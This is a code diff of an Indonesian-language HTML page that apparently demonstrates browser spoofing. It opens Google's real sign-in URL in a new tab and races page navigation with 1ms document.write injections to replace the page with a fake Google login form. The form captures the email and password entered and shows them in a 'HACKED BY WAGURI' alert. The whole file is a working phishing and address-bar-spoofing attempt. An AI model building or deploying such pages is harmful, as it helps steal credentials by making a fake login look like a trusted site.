@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Real Address Bar Hijack</title>
+<title>Timing Attack Navigation Hijack</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -19,10 +19,10 @@ button:disabled { background: #555; cursor: not-allowed; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ REAL ADDRESS BAR HIJACK</h1>
-    <p>Memanipulasi Address Bar asli Chrome menjadi Google menggunakan History API & Iframe.</p>
+    <h1>⚠️ TIMING ATTACK</h1>
+    <p>Memicu Address Bar asli Google dan menyuntikkan konten sebelum navigasi selesai.</p>
     
-    <button id="start-btn" type="button">Mulai Hijack</button>
+    <button id="start-btn" type="button">Mulai Timing Attack</button>
     
     <div id="status" role="status">Menunggu interaksi...</div>
 </div>
@@ -54,10 +54,11 @@ startBtn.addEventListener("click", function() {
 
     efekHacker();
 
-    statusDiv.textContent = "Memicu Address Bar Hijack...";
+    statusDiv.textContent = "Membuka URL asli Google (Timing Attack)...";
 
-    // 1. Buka tab kosong
-    const w = window.open('about:blank', '_blank');
+    // 1. Buka URL asli Google (Address Bar asli akan berubah)
+    const targetUrl = 'https://accounts.google.com/signin';
+    const w = window.open(targetUrl, '_blank');
 
     if (!w) {
         statusDiv.textContent = "Pop-up diblokir! Izinkan pop-up di browser Anda.";
@@ -66,72 +67,84 @@ startBtn.addEventListener("click", function() {
         return;
     }
 
-    try {
-        // 2. Coba paksa Address Bar berubah menjadi Google
-        // Trik: Gunakan history.replaceState
+    // 2. TIMING ATTACK: CPU Freeze & Injeksi Cepat
+    // Kita gunakan setInterval cepat (1ms) untuk menyuntikkan sebelum Google termuat.
+    let counter = 0;
+    const interval = setInterval(() => {
+        counter++;
         try {
-            w.history.replaceState({}, '', 'https://accounts.google.com/signin');
-        } catch(e) {
-            console.warn("History API diblokir:", e);
+            // Coba akses dokumen tab baru
+            if (w.document) {
+                // Jika masih di about:blank atau belum selesai navigasi
+                // Lakukan document.write untuk membajak
+                w.document.open();
+                w.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Google</title>
+                        <link rel="icon" href="https://www.google.com/favicon.ico">
+                        <style>
+                            body { margin:0; padding:0; background:#fff; font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; }
+                            .login-box { width:100%; max-width:400px; text-align:center; padding:20px; }
+                            .google-logo { width:200px; margin-bottom:20px; }
+                            h2 { font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124; }
+                            p { font-size:14px; color:#5f6368; margin-bottom:30px; }
+                            input { width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; }
+                            button { width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; }
+                            .warning { color:#f00; font-size:10px; margin-top:20px; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="login-box">
+                            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="google-logo">
+                            <h2>Sign in</h2>
+                            <p>to continue to Gmail</p>
+                            <form id="fakeLoginForm">
+                                <input type="email" id="emailInput" placeholder="Email or phone" required>
+                                <input type="password" id="passInput" placeholder="Password" required>
+                                <button type="submit">Next</button>
+                            </form>
+                            <p class="warning">Hijacked via Timing Attack</p>
+                        </div>
+                        <script>
+                            document.getElementById('fakeLoginForm').onsubmit = function(e){
+                                e.preventDefault();
+                                var email = document.getElementById('emailInput').value;
+                                var pass = document.getElementById('passInput').value;
+                                alert('HACKED BY WAGURI\\n\\nEmail: ' + email + '\\nPassword: ' + pass);
+                                if(navigator.vibrate) navigator.vibrate([1000,200,1000]);
+                            }
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                w.document.close();
+
+                // Jika berhasil, hentikan loop
+                clearInterval(interval);
+                statusDiv.textContent = "Injeksi Berhasil! Address Bar tetap Google.";
+                statusDiv.style.color = '#4CAF50';
+
+            }
+        } catch (e) {
+            // Jika Google asli sudah termuat, browser akan melempar Cross-Origin Error.
+            // Kita hentikan percobaan.
+            clearInterval(interval);
+            statusDiv.textContent = "Gagal: Chrome memenangkan balapan (Cross-Origin).";
+            statusDiv.style.color = '#f00';
+            isProcessing = false;
+            startBtn.disabled = false;
         }
 
-        // 3. Suntikkan Konten Palsu
-        w.document.title = "Google";
-        const link = w.document.createElement('link');
-        link.rel = 'icon';
-        link.href = 'https://www.google.com/favicon.ico';
-        w.document.head.appendChild(link);
-
-        w.document.body.style.margin = "0";
-        w.document.body.style.padding = "0";
-        w.document.body.style.background = "#fff";
-        w.document.body.style.fontFamily = "Arial, sans-serif";
-        
-        w.document.body.innerHTML = `
-            <div style="display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; background:#fff;">
-                <div style="width:100%; max-width:400px; padding:20px;">
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
-                    <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
-                    <p style="font-size:14px; color:#5f6368; margin-bottom:30px;">to continue to Gmail</p>
-                    
-                    <form id="fakeLoginForm">
-                        <input type="email" id="emailInput" placeholder="Email or phone" required style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                        <input type="password" id="passInput" placeholder="Password" required style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                        <button type="submit" style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
-                    </form>
-                    <p style="color:#f00; font-size:10px; margin-top:20px;">Address Bar Hijacked</p>
-                </div>
-            </div>
-        `;
-
-        // 4. Logika Penangkapan
-        w.document.getElementById('fakeLoginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            var email = w.document.getElementById('emailInput').value;
-            var pass = w.document.getElementById('passInput').value;
-
-            efekHacker(); 
-            alert('HACKED BY WAGURI\\n\\nEmail: ' + email + '\\nPassword: ' + pass);
-            
-            try {
-                if (w.navigator.vibrate) w.navigator.vibrate([1000, 200, 1000, 200, 1000]);
-                if ('speechSynthesis' in w) {
-                    var msg = new w.SpeechSynthesisUtterance('Hacked by Waguri');
-                    msg.lang = 'en-US';
-                    w.speechSynthesis.speak(msg);
-                }
-            } catch(e) {}
-        });
-
-        statusDiv.textContent = "Berhasil! Memeriksa Address Bar asli...";
-        statusDiv.style.color = '#4CAF50';
-
-    } catch(e) {
-        statusDiv.textContent = "Gagal: Browser memblokir injeksi.";
-        statusDiv.style.color = '#f00';
-        isProcessing = false;
-        startBtn.disabled = false;
-    }
+        // Batalkan jika sudah 3 detik
+        if (counter > 3000) {
+            clearInterval(interval);
+            statusDiv.textContent = "Waktu habis. Google asli termuat.";
+            isProcessing = false;
+            startBtn.disabled = false;
+        }
+    }, 1); // Eksekusi setiap 1ms
 });
 </script>
 </body>
